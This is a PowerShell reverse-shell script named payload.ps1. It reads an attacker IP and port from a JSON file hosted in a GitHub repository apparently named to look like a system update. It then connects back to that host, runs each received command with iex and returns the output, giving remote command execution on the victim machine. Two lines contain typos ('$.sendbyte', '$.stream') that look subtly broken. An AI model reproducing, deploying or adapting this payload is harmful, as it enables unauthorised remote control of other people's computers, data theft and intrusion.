# payload.ps1

# 1. Fetch IP from GitHub
try {
    $json = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kevinhamza/update-sys/main/ip.json" -UseBasicParsing
    $data = $json.Content | ConvertFrom-Json
    $ip = $data.attacker_ip
    $port = $data.port
} catch {
    Write-Host "Failed to fetch IP from GitHub"
    exit
}

# 2. Establish Reverse Shell (TCP)
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

# Send shell output to socket
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$.sendbyte.Length)
    $.stream.Flush()
}
$client.Close()
